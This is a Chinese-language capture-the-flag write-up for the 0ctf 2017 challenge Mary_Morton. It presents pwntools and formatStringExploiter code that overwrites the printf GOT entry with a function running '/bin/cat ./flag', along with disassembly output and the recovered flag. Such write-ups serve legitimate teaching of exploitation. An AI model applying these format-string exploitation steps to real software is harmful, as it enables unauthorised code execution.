# 0ctf quals 2017 : Mary_Morton
## **【原理】**
格式化字符串
## **【目的】**
掌握PWN题目的大致流程
## **【环境】**
Ubuntu
## **【工具】**
gdb、objdump、python
## **【步骤】**

### 总览

该题的设计比较简单，提供两种攻击方法——栈溢出和格式化字符串漏洞。该writeup使用了`formatStringExploiter`进行字符串漏洞进行攻击
Example:

```bash
$ ./mary_morton
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
2
%x
224dc6b0
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

*** stack smashing detected ***: ./mary_morton terminated
Aborted (core dumped)
```

### The Vulnerability


使用 `checksec`, 发现程序开启了`partial relro`。这意味着也已覆写 `GOT` 表。因为没有更多的保护措施，可以直接使用 `%n`覆写 `GOT`。

接下来考虑用什么覆写:

```
[0x00400960]> iz
vaddr=0x00400ad4 paddr=0x00000ad4 ordinal=000 sz=25 len=24 section=.rodata type=ascii string=Welcome to the battle !
vaddr=0x00400aed paddr=0x00000aed ordinal=001 sz=27 len=26 section=.rodata type=ascii string=[Great Fairy] level pwned
vaddr=0x00400b08 paddr=0x00000b08 ordinal=002 sz=20 len=19 section=.rodata type=ascii string=Select your weapon
vaddr=0x00400b1f paddr=0x00000b1f ordinal=003 sz=5 len=4 section=.rodata type=ascii string=Bye
vaddr=0x00400b24 paddr=0x00000b24 ordinal=004 sz=7 len=6 section=.rodata type=ascii string=Wrong!
vaddr=0x00400b2b paddr=0x00000b2b ordinal=005 sz=16 len=15 section=.rodata type=ascii string=/bin/cat ./flag
vaddr=0x00400b3b paddr=0x00000b3b ordinal=006 sz=7 len=6 section=.rodata type=ascii string=-> %s\n
vaddr=0x00400b42 paddr=0x00000b42 ordinal=007 sz=29 len=28 section=.rodata type=ascii string=1. Stack Bufferoverflow Bug
vaddr=0x00400b5f paddr=0x00000b5f ordinal=008 sz=22 len=21 section=.rodata type=ascii string=2. Format String Bug
vaddr=0x00400b75 paddr=0x00000b75 ordinal=009 sz=20 len=19 section=.rodata type=ascii string=3. Exit the battle
```

非常简单， `/bin/cat ./flag`就可以:

```
[0x004008da]> /r 0x00400b2b
[0x00400c98-0x0060109f] data 0x4008de mov edi, str._bin_cat_._flag in fcn.004008da
```

向上一点，发现:

```
│           0x004008da      55             push rbp
│           0x004008db      4889e5         mov rbp, rsp
│           0x004008de      bf2b0b4000     mov edi, str._bin_cat_._flag ; 0x400b2b ; "/bin/cat ./flag"
│           0x004008e3      e8b8fdffff     call sym.imp.system         ; int system(const char *string)
│           0x004008e8      90             nop
│           0x004008e9      5d             pop rbp
└           0x004008ea      c3             ret
```

确定 `0x004008da` 就是覆写的目标.


### Step 1: exec_fmt

第一步是用 `FormatString` 创建 exec_fmt

```py
def exec_fmt(s):
    p.sendline("2")
    sleep(0.1)
    p.sendline(s)
    ret = p.recvuntil("1. Stack Bufferoverflow Bug",drop=True)
    p.recvuntil("Exit the battle \n")
    return ret
```
Step 2: Instantiate Class

接下来，实例化FormatStrin. 同时使用 `ELF` 载入PE.

```py
from formatStringExploiter.FormatString import FormatString
from pwn import *

# 从 pwntools载入，一切都交给工具吧...
elf = ELF("./mary_morton")

# 使用FormatString
fmtStr = FormatString(exec_fmt,elf=elf)
```

FormatString会搜索缓冲区，最终会看到：

```
Found the offset to our input! Index = 6, Pad = 0
```

发现缓冲区之后，准备开始攻击。因为有20秒的时间限制，所以选择更加快速的方法：

```py
fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)
```


### Step 3: 获取flag

现在已经有了实例化的`FormatString` 和需要调用的函数

```py
# flag输出程序
winner = 0x4008DA

# Connect up
connect()

# Instantiate the format string with known values
fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)

# Ask our format string to overwrite the printf GOT entry with our function
fmtStr.write_q(elf.symbols['got.printf'], winner)

# Hit enter and our flag should be printed out.
p.sendline("2")
p.interactive()

# ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}
```

就...这么简单的获得到咯


## **【总结】**
虽然题很简单，但是毕竟我刚接触pwn，学到的还是很多的
